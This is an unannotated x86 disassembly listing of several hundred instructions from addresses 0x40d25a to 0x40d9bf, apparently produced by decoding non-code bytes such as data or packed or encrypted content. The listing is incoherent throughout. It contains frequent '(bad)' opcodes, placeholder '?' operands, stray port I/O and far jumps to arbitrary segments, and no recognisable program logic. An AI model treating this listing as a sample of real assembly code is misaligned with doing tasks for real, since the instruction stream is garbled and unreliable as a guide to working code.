  40d25a:	test   al,0x9d
  40d25c:	inc    edx
  40d25d:	scas   eax,DWORD PTR es:[edi]
  40d25e:	sub    DWORD PTR [esi-0x63ee2a6c],0x73eb7703
  40d268:	scas   al,BYTE PTR es:[edi]
  40d269:	jns    0x40d26f
  40d26b:	or     DWORD PTR [ebp+0x7d],0xffffffac
  40d26f:	and    BYTE PTR [edi],bh
  40d271:	push   ss
  40d272:	outs   dx,DWORD PTR ds:[esi]
  40d273:	ins    BYTE PTR es:[edi],dx
  40d274:	outs   dx,DWORD PTR ds:[esi]
  40d275:	in     al,0xae
  40d277:	and    eax,0x59dc04de
  40d27c:	mov    ?,ebx
  40d27e:	inc    esp
  40d27f:	outs   dx,BYTE PTR ds:[esi]
  40d280:	push   ds
  40d281:	add    al,0x25
  40d283:	mov    ecx,0x8e91607b
  40d288:	cmp    al,0xd5
  40d28a:	arpl   WORD PTR [ecx+0x72e14213],bp
  40d290:	jecxz  0x40d2b7
  40d292:	xchg   ebp,eax
  40d293:	or     ebp,DWORD PTR [ebp-0x1188cea0]
  40d299:	inc    esi
  40d29a:	cmp    esi,DWORD PTR [edx]
  40d29c:	(bad)  
  40d29d:	xor    DWORD PTR [eax-0xf],ebx
  40d2a0:	jp     0x40d31b
  40d2a2:	push   eax
  40d2a3:	xor    eax,0x3d1621a6
  40d2a8:	cmp    BYTE PTR [esi],al
  40d2aa:	pushf  
  40d2ab:	adc    BYTE PTR [ebp+0x50],bl
  40d2ae:	add    cl,dl
  40d2b0:	pop    ds
  40d2b1:	push   0xa5b70a80
  40d2b6:	mov    fs,eax
  40d2b8:	jb     0x40d2d9
  40d2ba:	jbe    0x40d2d3
  40d2bc:	scas   eax,DWORD PTR es:[edi]
  40d2bd:	jo     0x40d293
  40d2bf:	jne    0x40d257
  40d2c1:	adc    ebp,DWORD PTR [ebp-0xfeba253]
  40d2c7:	popf   
  40d2c8:	stos   DWORD PTR es:[edi],eax
  40d2c9:	xor    DWORD PTR [edi+0x2583d491],esp
  40d2cf:	jmp    0x98765b55
  40d2d4:	mov    al,0x7c
  40d2d6:	mov    dh,0xae
  40d2d8:	cdq    
  40d2d9:	add    bl,0x97
  40d2dc:	adc    al,0x2b
  40d2de:	add    bh,bh
  40d2e0:	push   es
  40d2e1:	mov    ebp,0x1f42314a
  40d2e6:	lods   eax,DWORD PTR ds:[esi]
  40d2e7:	in     al,0x67
  40d2e9:	loop   0x40d340
  40d2eb:	pop    esp
  40d2ec:	dec    eax
  40d2ed:	loop   0x40d2a5
  40d2ef:	daa    
  40d2f0:	(bad)  
  40d2f1:	mov    eax,ds:0x3df343f7
  40d2f6:	int    0x28
  40d2f8:	jp     0x40d30a
  40d2fa:	push   esp
  40d2fb:	bound  ebp,QWORD PTR [eax+ebp*2+0x6c]
  40d2ff:	mov    ch,0xda
  40d301:	add    al,0x79
  40d303:	cmp    al,0x32
  40d305:	les    eax,FWORD PTR [edi-0x6cd3f827]
  40d30b:	add    eax,0x73a00983
  40d310:	cmp    al,0xfc
  40d312:	jge    0x40d2cb
  40d314:	mov    ch,0x40
  40d316:	leave  
  40d317:	xor    cl,BYTE PTR [esi]
  40d319:	xchg   ecx,eax
  40d31a:	pop    ebx
  40d31b:	mov    esp,0x14f743e8
  40d320:	dec    eax
  40d321:	sub    edi,DWORD PTR [edx]
  40d323:	push   cs
  40d324:	lea    edx,[edx+0x56]
  40d327:	loopne 0x40d33c
  40d329:	das    
  40d32a:	loope  0x40d2d2
  40d32c:	sti    
  40d32d:	retf   
  40d32e:	dec    edx
  40d32f:	adc    BYTE PTR [esi+0x19],dl
  40d332:	jp     0x40d37d
  40d334:	retf   0x9349
  40d337:	cmp    ecx,esi
  40d339:	pop    ds
  40d33a:	pop    edi
  40d33b:	into   
  40d33c:	jg     0x40d391
  40d33e:	sbb    cl,dh
  40d340:	xchg   DWORD PTR [esi],edx
  40d342:	mov    bh,0xe7
  40d344:	cmc    
  40d345:	ret    
  40d346:	push   ss
  40d347:	sti    
  40d348:	mov    cl,0x65
  40d34a:	mov    dl,0xb
  40d34c:	jo     0x40d38e
  40d34e:	arpl   WORD PTR [edi-0x45458dbf],bp
  40d354:	mov    ds:0xf1ef5c21,al
  40d359:	cmp    BYTE PTR [ecx],cl
  40d35b:	push   es
  40d35c:	jmp    0x40d2df
  40d35e:	loop   0x40d30c
  40d360:	jp     0x40d2fc
  40d362:	sti    
  40d363:	xlat   BYTE PTR ds:[ebx]
  40d364:	cmp    al,0x42
  40d366:	lahf   
  40d367:	push   es
  40d368:	std    
  40d369:	lods   eax,DWORD PTR ds:[esi]
  40d36a:	push   cs
  40d36b:	jecxz  0x40d3a2
  40d36d:	add    al,0xc8
  40d36f:	adc    al,0x6e
  40d371:	add    BYTE PTR [ebp-0x331862c0],dl
  40d377:	xchg   edx,eax
  40d378:	fimul  WORD PTR [edi+0x18]
  40d37b:	or     BYTE PTR [ecx+0x3f76c1dc],bh
  40d381:	jb     0x40d3e0
  40d383:	repnz idiv BYTE PTR [ebx+0x3d34f86c]
  40d38a:	xchg   ebx,eax
  40d38b:	push   ebp
  40d38c:	push   ds
  40d38d:	jno    0x40d37b
  40d38f:	sub    al,0x2c
  40d391:	jbe    0x40d34b
  40d393:	daa    
  40d394:	je     0x40d36a
  40d396:	sahf   
  40d397:	aam    0x66
  40d399:	jae    0x40d335
  40d39b:	push   edi
  40d39c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d39d:	mov    ds:0xd7b5a2fe,al
  40d3a2:	(bad)  
  40d3a3:	fld    TBYTE PTR [esi-0x39f6c92e]
  40d3a9:	stc    
  40d3aa:	jecxz  0x40d3de
  40d3ac:	out    dx,al
  40d3ad:	or     eax,0xbcdaf1b
  40d3b2:	xchg   ebp,eax
  40d3b3:	ja     0x40d3cb
  40d3b5:	inc    esp
  40d3b6:	mov    dl,0xb2
  40d3b8:	daa    
  40d3b9:	adc    al,ah
  40d3bb:	loop   0x40d431
  40d3bd:	retf   0x10cd
  40d3c0:	repnz sahf 
  40d3c2:	jbe    0x40d3e9
  40d3c4:	sub    eax,0xf06533f1
  40d3c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3ca:	repnz bound ebp,QWORD PTR [ebx-0x62734aa1]
  40d3d1:	rol    DWORD PTR [ebx-0x70],cl
  40d3d4:	pushf  
  40d3d5:	call   0x65e7faec
  40d3da:	out    dx,al
  40d3db:	xchg   esi,eax
  40d3dc:	(bad)  
  40d3dd:	stc    
  40d3de:	mov    cl,0x23
  40d3e0:	mov    ebp,0x1bd23a9a
  40d3e5:	xchg   DWORD PTR [ebx],ebx
  40d3e7:	in     al,dx
  40d3e8:	xor    DWORD PTR [eax+eax*8],ebp
  40d3eb:	jno    0x40d41d
  40d3ed:	ret    
  40d3ee:	loope  0x40d412
  40d3f0:	dec    esp
  40d3f1:	adc    bh,BYTE PTR [ebp-0x1d4640e6]
  40d3f7:	fnstcw WORD PTR [ebx-0x66]
  40d3fa:	push   ebp
  40d3fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3fc:	sar    DWORD PTR [ecx],0x84
  40d3ff:	sub    al,0xfc
  40d401:	adc    al,0x55
  40d403:	fidivr WORD PTR ds:0x8fccc1b2
  40d409:	jle    0x40d488
  40d40b:	and    ch,al
  40d40d:	and    DWORD PTR [eax+0x3c],0xc
  40d411:	mov    edx,0x8b2f8f34
  40d416:	add    eax,0xa4f74253
  40d41b:	dec    ebp
  40d41c:	test   al,0x1c
  40d41e:	mov    ch,0x69
  40d420:	sbb    eax,0x77821c6d
  40d425:	push   ebp
  40d426:	das    
  40d427:	dec    ecx
  40d428:	sti    
  40d429:	add    cl,BYTE PTR [ebp-0x60]
  40d42c:	(bad)  
  40d42d:	jp     0x40d485
  40d42f:	inc    esp
  40d430:	adc    al,dl
  40d432:	push   esp
  40d433:	adc    al,0x60
  40d435:	rcl    BYTE PTR [eax],cl
  40d437:	mov    esp,0xcef7d675
  40d43c:	into   
  40d43d:	rol    DWORD PTR [esi],1
  40d43f:	add    ebx,ecx
  40d441:	jmp    0x40d41a
  40d443:	das    
  40d444:	mov    esi,0xe89303c5
  40d449:	push   0xcf31a34d
  40d44e:	jae    0x40d41f
  40d450:	inc    edx
  40d451:	outs   dx,BYTE PTR ds:[esi]
  40d452:	sti    
  40d453:	arpl   WORD PTR [eax-0x48],sp
  40d456:	pop    edi
  40d457:	push   edx
  40d458:	(bad)  
  40d45a:	mov    ebp,0x279337db
  40d45f:	je     0x40d425
  40d461:	stc    
  40d462:	jp     0x40d415
  40d464:	xor    ah,BYTE PTR [esi+0x55]
  40d467:	cmp    eax,0xe12097a4
  40d46c:	push   ebx
  40d46d:	push   ebx
  40d46e:	push   esi
  40d46f:	int3   
  40d470:	nop
  40d471:	xor    al,0xfe
  40d473:	xchg   ebp,eax
  40d474:	push   ecx
  40d475:	mov    bh,0x13
  40d477:	mov    edx,0xc597d99d
  40d47c:	adc    BYTE PTR [ebx],0xe2
  40d47f:	mov    ecx,0xd21b2418
  40d484:	cmp    al,BYTE PTR [edx+0x3e]
  40d487:	push   edx
  40d488:	add    esi,ebx
  40d48a:	xchg   esi,eax
  40d48b:	mov    eax,0xc6276f1d
  40d490:	sbb    BYTE PTR [ecx],dh
  40d492:	xor    DWORD PTR [eax+0x7e6ec31e],edx
  40d498:	jge    0x40d512
  40d49a:	loopne 0x40d47a
  40d49c:	fidivr DWORD PTR [eax+ebp*2+0x508e9206]
  40d4a3:	addr16 inc ecx
  40d4a5:	loopne 0x40d4de
  40d4a7:	in     eax,dx
  40d4a8:	jno    0x40d435
  40d4aa:	mov    eax,0xa0b60ef9
  40d4af:	push   es
  40d4b0:	xchg   ebx,eax
  40d4b1:	shr    BYTE PTR [ecx+0x75b7f172],cl
  40d4b7:	mov    bh,0x2f
  40d4b9:	sbb    bl,al
  40d4bb:	imul   ebx,DWORD PTR [edx-0x74ed574b],0x76d3c9cf
  40d4c5:	cld    
  40d4c6:	pop    ecx
  40d4c7:	inc    eax
  40d4c8:	loope  0x40d50f
  40d4ca:	add    eax,0xbb416e02
  40d4cf:	ss jge 0x40d529
  40d4d2:	rcr    BYTE PTR [ecx+0x1b],cl
  40d4d5:	and    bl,BYTE PTR [esi]
  40d4d7:	xor    DWORD PTR [edi],eax
  40d4d9:	mov    bl,BYTE PTR [edx+0x28b596d9]
  40d4df:	(bad)  
  40d4e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4e1:	or     eax,0x86478bc0
  40d4e6:	addr16 std 
  40d4e8:	dec    BYTE PTR [esi]
  40d4ea:	jp     0x40d4e1
  40d4ec:	out    dx,al
  40d4ed:	es cli 
  40d4ef:	loop   0x40d4b0
  40d4f1:	and    al,0x82
  40d4f3:	jmp    0x40d0:0x428c2c8e
  40d4fa:	add    edi,DWORD PTR ds:0x9d4de888
  40d500:	fisub  WORD PTR [edi-0x5e]
  40d503:	jl     0x40d541
  40d505:	lock mov ecx,DWORD PTR [ebx-0x5]
  40d509:	sub    BYTE PTR [edi],al
  40d50b:	add    BYTE PTR [ebx+0x1b],dh
  40d50e:	ret    0xc2dc
  40d511:	lods   eax,DWORD PTR ds:[esi]
  40d512:	imul   edi,DWORD PTR ds:0x6e0cefa4,0x37eac41b
  40d51c:	or     ah,dl
  40d51e:	mov    al,0x97
  40d520:	not    BYTE PTR [edi-0x75491513]
  40d526:	mul    DWORD PTR [esp+edi*1-0x32b8c402]
  40d52d:	mov    DWORD PTR [edx+0x68],edi
  40d530:	mov    bl,0xce
  40d532:	in     al,0xf6
  40d534:	and    al,0x95
  40d536:	mov    ch,0xc6
  40d538:	cdq    
  40d539:	(bad)
  40d53d:	jge    0x40d5bb
  40d53f:	cli    
  40d540:	imul   esp,DWORD PTR [ebp+0x29],0xffffff87
  40d544:	fnstsw WORD PTR [ebx-0x396205b0]
  40d54a:	sbb    DWORD PTR [ebp-0x2c],ebp
  40d54d:	dec    edi
  40d54e:	add    eax,0xf31ceb71
  40d553:	inc    ecx
  40d554:	test   al,0xc3
  40d556:	lods   al,BYTE PTR ds:[esi]
  40d557:	fild   QWORD PTR [esi]
  40d559:	jae    0x40d506
  40d55b:	lock mov eax,0x92f3073c
  40d561:	xchg   edx,eax
  40d562:	clc    
  40d563:	mov    bx,0x4667
  40d567:	retf   
  40d568:	(bad)  
  40d569:	push   0x3a58044c
  40d56e:	push   ss
  40d56f:	mov    eax,ds:0xdd3b0a37
  40d574:	mov    ebx,0x1a446438
  40d579:	fwait
  40d57a:	jmp    0x40d5c3
  40d57c:	adc    eax,DWORD PTR [eax]
  40d57e:	loopne 0x40d53f
  40d580:	fist   WORD PTR [ecx-0xd]
  40d583:	in     al,dx
  40d584:	mov    bh,0xa3
  40d586:	xchg   esi,eax
  40d587:	inc    eax
  40d588:	pop    edi
  40d589:	inc    ebp
  40d58a:	push   ebx
  40d58b:	mov    ch,0x2f
  40d58d:	dec    edi
  40d58e:	mov    edx,0xf3314579
  40d593:	jnp    0x40d52a
  40d595:	ss pop ss
  40d597:	mov    dl,0x48
  40d599:	imul   eax,DWORD PTR [edx],0x58
  40d59c:	push   ss
  40d59d:	(bad)  
  40d59f:	sti    
  40d5a0:	cs jne 0x40d524
  40d5a3:	fnstenv [ecx]
  40d5a5:	loopne 0x40d626
  40d5a7:	ds lods al,BYTE PTR es:[esi]
  40d5aa:	cmp    BYTE PTR [ebx],ch
  40d5ac:	dec    esp
  40d5ad:	fadd   QWORD PTR ds:0x7283fd0c
  40d5b3:	dec    eax
  40d5b4:	inc    edi
  40d5b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5b6:	jp     0x40d599
  40d5b8:	jmp    0x40d609
  40d5ba:	aad    0x8d
  40d5bc:	sbb    cl,BYTE PTR [edx+0x49]
  40d5bf:	fdivr  DWORD PTR [ecx+eax*1+0x75]
  40d5c3:	xchg   BYTE PTR [esi+0x56bdf147],dh
  40d5c9:	ss xchg ebp,eax
  40d5cb:	dec    ebp
  40d5cc:	sub    bl,BYTE PTR [ebp-0x1e3ae453]
  40d5d2:	lods   eax,DWORD PTR ds:[esi]
  40d5d3:	test   al,0x6d
  40d5d5:	hlt    
  40d5d6:	sub    al,0x93
  40d5d8:	or     al,0x3b
  40d5da:	cmc    
  40d5db:	stc    
  40d5dc:	sbb    dh,0x44
  40d5df:	fdivr  QWORD PTR [eax+ebx*1-0x7b]
  40d5e3:	jg     0x40d566
  40d5e5:	mov    ebp,0xe639ba6e
  40d5ea:	mov    edi,0x46cd7675
  40d5ef:	sahf   
  40d5f0:	mov    edx,0xc520208c
  40d5f5:	mov    ah,0x70
  40d5f7:	mov    ds:0xe290f345,eax
  40d5fc:	sbb    cl,BYTE PTR [ebx-0x5d]
  40d5ff:	pop    esp
  40d600:	sahf   
  40d601:	push   edx
  40d602:	or     esp,ebx
  40d604:	push   ebp
  40d605:	xchg   edi,eax
  40d606:	mov    ds:0xc4edab75,al
  40d60b:	sub    eax,0xaa638f11
  40d610:	mov    DWORD PTR [ebx+0x52],esi
  40d613:	lock cmc 
  40d615:	nop
  40d616:	mul    BYTE PTR [ebx+0x701b0d3b]
  40d61c:	lods   al,BYTE PTR ds:[esi]
  40d61d:	sub    BYTE PTR [esi+0x7a],bl
  40d620:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d621:	data16 data16 out dx,al
  40d624:	or     eax,0x19d58491
  40d629:	out    dx,eax
  40d62a:	call   0xf4d:0x32f3e704
  40d631:	frndint 
  40d633:	sbb    cl,BYTE PTR [ebx+edx*2-0x18600f2f]
  40d63a:	into   
  40d63b:	imul   BYTE PTR [ecx+0x4ea89448]
  40d641:	stc    
  40d642:	pop    edx
  40d643:	aad    0x2d
  40d645:	ins    DWORD PTR es:[edi],dx
  40d646:	fimul  WORD PTR ds:0xd4c01d97
  40d64c:	xchg   ebx,eax
  40d64d:	fstp   TBYTE PTR [edx+0x60]
  40d650:	(bad)  
  40d651:	push   ss
  40d652:	mov    dl,BYTE PTR [edx-0x35]
  40d655:	and    eax,0xc867b163
  40d65a:	mov    ch,0xc
  40d65c:	inc    esi
  40d65d:	mov    ah,0xc4
  40d65f:	cmp    ch,bl
  40d661:	pushf  
  40d662:	or     DWORD PTR [ebx-0x53],esi
  40d665:	sbb    edx,DWORD PTR [ebx]
  40d667:	enter  0x64d2,0xa3
  40d66b:	clc    
  40d66c:	ins    DWORD PTR es:[edi],dx
  40d66d:	shl    DWORD PTR [edx+0x313a6743],cl
  40d673:	in     eax,dx
  40d674:	jmp    0x7cf52340
  40d679:	daa    
  40d67a:	imul   esp,DWORD PTR [ecx+edx*4+0x5f],0x618a3a40
  40d682:	lahf   
  40d683:	jno    0x40d638
  40d685:	outs   dx,BYTE PTR ds:[esi]
  40d686:	int3   
  40d687:	stos   DWORD PTR es:[edi],eax
  40d688:	out    0x49,al
  40d68a:	dec    dh
  40d68c:	add    eax,0xea1518cc
  40d691:	adc    al,0x9b
  40d693:	frstor ds:0xd314f135
  40d699:	mov    bl,0xdc
  40d69b:	sbb    bl,BYTE PTR [edx+edi*4-0x54]
  40d69f:	inc    esi
  40d6a0:	je     0x40d6d4
  40d6a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6a3:	add    DWORD PTR [esi],ebp
  40d6a5:	or     dh,0x1b
  40d6a8:	es inc esp
  40d6aa:	jp     0x40d6ab
  40d6ac:	stc    
  40d6ad:	inc    ecx
  40d6ae:	inc    edx
  40d6af:	lods   eax,DWORD PTR ds:[esi]
  40d6b1:	call   0x9cd6:0x5a710df6
  40d6b8:	fwait
  40d6b9:	mov    ch,0x64
  40d6bb:	jo     0x40d64e
  40d6bd:	pusha  
  40d6be:	lods   al,BYTE PTR ds:[esi]
  40d6bf:	cwde   
  40d6c0:	adc    esp,DWORD PTR [ecx-0x1f]
  40d6c3:	sbb    DWORD PTR [ebx-0x535c9d69],edi
  40d6c9:	push   ebx
  40d6ca:	adc    bl,bl
  40d6cc:	(bad)  
  40d6cd:	xchg   esp,eax
  40d6ce:	sub    BYTE PTR [ebx],dh
  40d6d0:	pop    ds
  40d6d1:	mov    bh,bl
  40d6d3:	leave  
  40d6d4:	mov    ds:0x5bfcfa2d,al
  40d6d9:	dec    ebx
  40d6da:	dec    esi
  40d6db:	add    al,0xf2
  40d6dd:	ja     0x40d74d
  40d6df:	or     edi,DWORD PTR [esi+ebx*4]
  40d6e2:	lahf   
  40d6e3:	and    edx,DWORD PTR [ecx-0x4f]
  40d6e6:	imul   DWORD PTR [esp+edi*2]
  40d6e9:	les    ecx,FWORD PTR [ebx-0x80]
  40d6ec:	lods   eax,DWORD PTR ds:[esi]
  40d6ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6ee:	clc    
  40d6ef:	cmp    ecx,eax
  40d6f1:	sti    
  40d6f2:	inc    edi
  40d6f3:	lods   al,BYTE PTR ds:[esi]
  40d6f4:	inc    ebx
  40d6f5:	sti    
  40d6f6:	pop    edx
  40d6f7:	mov    esi,ebp
  40d6f9:	fsubr  DWORD PTR [ebx-0x41d9c52]
  40d6ff:	dec    ecx
  40d700:	jbe    0x40d6a1
  40d702:	in     eax,dx
  40d703:	test   BYTE PTR [edx],0xe5
  40d706:	sub    eax,0x44dd668d
  40d70b:	mov    ah,0x53
  40d70d:	cmp    DWORD PTR [esi+0x57],ecx
  40d710:	add    eax,0x80232ac
  40d715:	test   cl,ah
  40d717:	or     BYTE PTR [edi-0x1f683392],bl
  40d71d:	bound  eax,QWORD PTR [edx+0x7a626e28]
  40d723:	jmp    0x40d6e0
  40d725:	jnp    0x40d79d
  40d727:	add    edi,esi
  40d729:	nop
  40d72a:	scas   al,BYTE PTR es:[edi]
  40d72b:	(bad)  
  40d72d:	daa    
  40d72e:	push   0x43
  40d730:	int3   
  40d731:	dec    esi
  40d732:	loope  0x40d70c
  40d734:	popa   
  40d735:	outs   dx,BYTE PTR ds:[esi]
  40d736:	icebp  
  40d737:	jno    0x40d757
  40d739:	addr16 jno 0x40d70c
  40d73c:	(bad)  
  40d73d:	dec    edi
  40d73e:	add    ebx,edi
  40d740:	adc    ah,BYTE PTR [edx]
  40d742:	imul   edx,DWORD PTR [ecx],0xf4573290
  40d748:	jmp    0x40d6d7
  40d74a:	sbb    BYTE PTR [esi-0x1e],ch
  40d74d:	outs   dx,DWORD PTR ds:[esi]
  40d74e:	repnz hlt 
  40d750:	xchg   edx,eax
  40d751:	daa    
  40d752:	fnstcw WORD PTR [ebp-0x1b]
  40d755:	push   edi
  40d756:	shl    DWORD PTR [eax+0x7396d409],cl
  40d75c:	pop    esi
  40d75d:	mov    WORD PTR [ecx],gs
  40d75f:	fnstcw WORD PTR [ecx-0x1d]
  40d762:	addr16 cmp al,0xc2
  40d765:	mov    eax,ds:0xfc685ebb
  40d76a:	adc    DWORD PTR [ebp-0x406bd027],0xffffffd9
  40d771:	stc    
  40d772:	add    eax,0x6f230e23
  40d777:	mov    cl,0xf9
  40d779:	in     al,dx
  40d77a:	fistp  DWORD PTR [edx]
  40d77c:	xor    BYTE PTR [ecx+0x38],dh
  40d77f:	adc    DWORD PTR [esi],0x2a
  40d782:	pop    ebp
  40d783:	(bad)  
  40d784:	mov    esp,0xf70e2889
  40d789:	sbb    ebx,edi
  40d78b:	add    al,0xef
  40d78d:	or     BYTE PTR [ebx+0x36],ah
  40d790:	dec    esi
  40d791:	je     0x40d77b
  40d793:	or     esi,ecx
  40d795:	inc    esi
  40d796:	call   0x144a:0xffc7dd65
  40d79d:	sbb    BYTE PTR [ecx+ebx*8+0x3c],ch
  40d7a1:	aam    0xb2
  40d7a3:	pop    edx
  40d7a4:	cmp    eax,0xbc594483
  40d7a9:	or     al,0xd1
  40d7ab:	fadd   QWORD PTR [eax]
  40d7ad:	shr    DWORD PTR [eax],0xc9
  40d7b0:	retf   0x1e62
  40d7b3:	in     eax,dx
  40d7b4:	shl    BYTE PTR [ecx-0x2c],0xd2
  40d7b8:	loopne 0x40d75c
  40d7ba:	push   ebx
  40d7bb:	mov    bh,BYTE PTR [edi]
  40d7bd:	repnz dec esp
  40d7bf:	push   edi
  40d7c0:	sbb    ebp,edx
  40d7c2:	adc    eax,0x68828580
  40d7c7:	stos   DWORD PTR es:[edi],eax
  40d7c8:	cld    
  40d7c9:	js     0x40d794
  40d7cb:	test   DWORD PTR [edx-0x65f55688],esi
  40d7d1:	sbb    cl,BYTE PTR [edx-0x247a194c]
  40d7d7:	xchg   ebx,eax
  40d7d8:	ins    DWORD PTR es:[edi],dx
  40d7d9:	(bad)  
  40d7da:	sbb    ch,ah
  40d7dc:	push   ebx
  40d7dd:	fistp  QWORD PTR [edi+esi*4]
  40d7e0:	cmp    al,0x3a
  40d7e2:	shr    DWORD PTR [ecx],cl
  40d7e4:	std    
  40d7e5:	xchg   esp,ebx
  40d7e7:	pop    edi
  40d7e8:	leave  
  40d7e9:	push   ss
  40d7ea:	cmp    esp,DWORD PTR [edx]
  40d7ec:	loope  0x40d799
  40d7ee:	jle    0x40d7f1
  40d7f0:	out    dx,al
  40d7f1:	(bad)  
  40d7f2:	stc    
  40d7f3:	aaa    
  40d7f4:	xchg   esp,eax
  40d7f5:	dec    esi
  40d7f6:	sbb    eax,0xdd06badc
  40d7fb:	jg     0x40d866
  40d7fd:	cmp    edx,0xffffffff
  40d800:	(bad)  
  40d801:	mov    al,ds:0xa1ba5709
  40d806:	adc    eax,0x5b1c8931
  40d80b:	mov    ch,0x96
  40d80d:	pop    esi
  40d80e:	or     al,0xe3
  40d810:	enter  0xb774,0xe7
  40d814:	sbb    al,0xee
  40d816:	jb     0x40d81e
  40d818:	lock adc DWORD PTR ds:0xbdc2509f,esi
  40d81f:	fsub   DWORD PTR [eax+edi*4+0x7df7d48]
  40d826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d827:	arpl   WORD PTR [ecx-0x54],ax
  40d82a:	push   edi
  40d82b:	jmp    0x6654:0x9cc98c69
  40d832:	or     eax,0xafc52203
  40d837:	inc    esp
  40d838:	jle    0x40d831
  40d83a:	loopne 0x40d8ac
  40d83c:	inc    ecx
  40d83d:	daa    
  40d83e:	neg    BYTE PTR [ebx+0x15dcf39]
  40d844:	push   edx
  40d845:	sti    
  40d846:	add    al,0x62
  40d848:	mov    esi,0x15ecbd74
  40d84d:	(bad)  
  40d84e:	push   esi
  40d84f:	pop    eax
  40d850:	or     BYTE PTR [ebp-0x322f91ab],bh
  40d856:	mov    cl,0x3b
  40d858:	mov    ds:0x87ebfd0c,al
  40d85d:	gs pop eax
  40d85f:	iret   
  40d860:	fst    DWORD PTR [esi]
  40d862:	icebp  
  40d863:	stos   BYTE PTR es:[edi],al
  40d864:	cmp    DWORD PTR [ecx+0x8],esi
  40d867:	fst    st(5)
  40d869:	add    ah,bh
  40d86b:	call   0x704b:0x7cd431b3
  40d872:	xchg   BYTE PTR [eax+0x21],ah
  40d875:	fs or  edi,ebx
  40d878:	and    BYTE PTR [ebp-0x47fed81c],dh
  40d87e:	shl    BYTE PTR [edi],cl
  40d880:	les    esi,FWORD PTR [ebp-0x5e0ea759]
  40d886:	aam    0xf0
  40d888:	jb     0x40d88a
  40d88a:	(bad)  
  40d88b:	out    0x9b,al
  40d88d:	jb     0x40d86c
  40d88f:	sahf   
  40d890:	fstp   TBYTE PTR [ebx+0x7dcd314a]
  40d896:	retf   
  40d897:	int    0xa0
  40d899:	mov    al,0x36
  40d89b:	test   DWORD PTR [esi],eax
  40d89d:	cmp    BYTE PTR [ebx],al
  40d89f:	cmp    bl,BYTE PTR [ecx+0x2eda83ed]
  40d8a5:	adc    al,0x90
  40d8a7:	or     al,0x15
  40d8aa:	mov    esi,0x74b3f0b1
  40d8af:	sbb    ecx,DWORD PTR [ebx]
  40d8b1:	lods   al,BYTE PTR ds:[esi]
  40d8b2:	mov    ds:0x3676b2f4,al
  40d8b7:	dec    ebx
  40d8b8:	in     eax,dx
  40d8b9:	out    dx,al
  40d8ba:	lods   eax,DWORD PTR ds:[esi]
  40d8bb:	inc    eax
  40d8bc:	and    eax,0x616ed4f5
  40d8c1:	sti    
  40d8c2:	retf   
  40d8c3:	mov    dh,0x98
  40d8c5:	sbb    eax,DWORD PTR [esi]
  40d8c7:	mov    WORD PTR [eax],?
  40d8c9:	ror    DWORD PTR [ebx-0x79],1
  40d8cc:	adc    al,0xe3
  40d8ce:	ins    BYTE PTR es:[edi],dx
  40d8cf:	stos   DWORD PTR es:[edi],eax
  40d8d0:	xor    al,0xc
  40d8d2:	pusha  
  40d8d3:	hlt    
  40d8d4:	and    al,0xac
  40d8d6:	call   0xe2d2:0xab2b187
  40d8dd:	aam    0x74
  40d8df:	add    ebx,DWORD PTR [esi]
  40d8e1:	jb     0x40d917
  40d8e3:	dec    esp
  40d8e4:	jl     0x40d915
  40d8e6:	in     eax,0x81
  40d8e8:	imul   edx,DWORD PTR [eax-0x2d],0x54
  40d8ec:	xor    al,0x44
  40d8ef:	lahf   
  40d8f0:	dec    ebx
  40d8f1:	(bad)  
  40d8f3:	add    DWORD PTR [ebx],ebp
  40d8f5:	imul   edx,DWORD PTR [esi+0x5a15ffc2],0x712080fd
  40d8ff:	(bad)  
  40d901:	pusha  
  40d902:	ror    DWORD PTR [eax-0x69],cl
  40d905:	mov    edx,0xebbc8b62
  40d90a:	dec    ecx
  40d90b:	leave  
  40d90c:	cmp    eax,0x32db86f1
  40d911:	or     eax,DWORD PTR [eax-0x5d664e2c]
  40d917:	out    dx,al
  40d918:	xor    ebx,DWORD PTR [ecx-0x39c397b3]
  40d91e:	not    edx
  40d920:	push   ebp
  40d921:	inc    ebx
  40d922:	mov    DWORD PTR [esp+edx*4],esi
  40d925:	push   eax
  40d926:	jbe    0x40d8bf
  40d928:	jne    0x40d93d
  40d92a:	fimul  DWORD PTR [ebp+0x1838d0cb]
  40d930:	pop    esp
  40d931:	stos   BYTE PTR es:[edi],al
  40d932:	add    eax,0x66070d8a
  40d937:	push   0x2774575c
  40d93c:	xchg   DWORD PTR [ebx],eax
  40d93e:	sbb    DWORD PTR [edi+esi*2+0x25],0x6462b1f5
  40d946:	test   DWORD PTR [esi],esp
  40d948:	pop    esp
  40d949:	and    eax,0xf3a49f41
  40d94e:	mov    bl,0xcf
  40d950:	pop    edi
  40d951:	push   esi
  40d952:	sti    
  40d953:	mov    dl,0x8e
  40d955:	sbb    esi,DWORD PTR [eax+eax*1+0x5c542633]
  40d95c:	test   eax,0xdeeffc69
  40d961:	test   al,0xca
  40d963:	inc    ecx
  40d964:	out    0xd5,al
  40d966:	pop    edx
  40d967:	mov    edx,0x455f12ad
  40d96c:	mov    ch,0x5a
  40d96e:	mov    ecx,gs
  40d970:	mov    ecx,0xb394abfd
  40d975:	mov    esi,0x2615afec
  40d97a:	sub    esp,DWORD PTR [esi]
  40d97c:	mov    edx,0x2a58d4c5
  40d981:	cld    
  40d982:	mov    bh,BYTE PTR [eax+ebp*1+0x8]
  40d986:	arpl   WORD PTR [ecx],bx
  40d988:	ror    BYTE PTR [esi-0x6f407a31],1
  40d98e:	div    DWORD PTR [esi+0x4161990f]
  40d994:	pop    ss
  40d995:	xchg   edx,eax
  40d996:	adc    eax,0xbb8648fc
  40d99b:	dec    edx
  40d99c:	es aam 0x9d
  40d99f:	inc    esp
  40d9a0:	mov    ?,WORD PTR [ecx+0x5e417bb1]
  40d9a6:	mov    ebx,0xb1a7a98c
  40d9ab:	cmp    esp,edx
  40d9ad:	dec    esp
  40d9ae:	imul   edi,DWORD PTR ds:0xcd792621,0xc1ff176d
  40d9b8:	dec    ecx
  40d9b9:	lea    edi,[ebx-0x4cebb73e]
  40d9bf:	xlat   BYTE PTR ds:[ebx]
